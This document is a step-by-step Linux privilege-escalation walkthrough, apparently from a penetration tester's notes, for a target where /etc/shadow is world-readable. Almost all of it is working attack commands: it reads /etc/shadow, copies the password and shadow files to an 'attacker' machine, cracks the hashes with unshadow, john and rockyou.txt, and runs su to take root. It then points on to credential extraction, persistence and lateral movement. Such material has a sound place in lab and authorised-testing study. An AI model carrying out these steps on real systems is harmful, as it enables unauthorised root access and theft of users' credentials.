
⚠️ **Hard preconditions — verified in Step 1.**

- **/etc/shadow has world-read permission** on the current target.
- **Target hash is not locked.** `!`, `*`, or `!*` in the hash field means the account is password-disabled and the value cannot be cracked.
- **Cracker has a wordlist with adequate coverage.** `rockyou.txt` is the canonical first attempt. Strong random passwords will not yield within bounded time.

No external lookup needed — every precondition is checked in Step 1 below.

---

## Step 1 — Preflight verification

### Confirm /etc/shadow is readable:

`ls -l /etc/shadow`

- Permissions include `r` for `others` (e.g. `-rw-r--r--`) → proceed.
- Default `-rw-r-----` → walkthrough doesn't apply.

### Inspect target hash field:

`grep '^root:' /etc/shadow`

Expected format: `root:$<id>$<salt>$<hash>:<rest...>`.

- Hash field starts with `$1$`, `$5$`, `$6$`, or `$y$` → crackable hash present → proceed.
- Hash field is `!`, `*`, or `!*` → account locked → walkthrough doesn't apply.
- Hash field empty (`root::...`) → no password set → run `su -` directly (no cracking required).

---

## Step 2 — Exfiltrate /etc/passwd and /etc/shadow to attacker

On target:

`cat /etc/passwd`

Copy output → save on attacker as `passwd_target.txt`.

`cat /etc/shadow`

Copy output → save on attacker as `shadow_target.txt`.

---

## Step 3 — Combine with unshadow

On attacker, in the directory containing both files:

`unshadow passwd_target.txt shadow_target.txt > unshadowed.txt`

Verify:

`grep '^root:' unshadowed.txt`

Should show `root:$<id>$...` format with hash inline.

---

## Step 4 — Crack with john

Decompress rockyou if gzipped on Kali (one-time per Kali install):

`sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null`

Crack:

`john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

Watch for output line in form:

`<plaintext> (<user>)`

**Make sure to note cracked password/user combinations**

- Hit on `(root)` → record `<plaintext>`, proceed to Step 5.
- Hit on a non-root user → still useful for lateral / sudo enumeration from that user's context; pick highest-privilege user if multiple cracked.
- John exits with no hit → wordlist insufficient. See [[Cracking Hashes]] for wordlist + rules expansion.
- Resume/inspect after restart: `john --show unshadowed.txt`.

---

## Step 5 — Elevate

On target, in the user shell:

`su - <user>`

Enter cracked password at prompt.

- `<user>` is `root` and prompt returns `#` → root achieved. Done.
- `<user>` is non-root → proceed as that user; re-run [[Linux Privilege Escalation Checksheet]] from this user's context.
- "Authentication failure" → cracked value mismatched (whitespace, transcription error); re-verify John output and retry.

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes from same file, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]
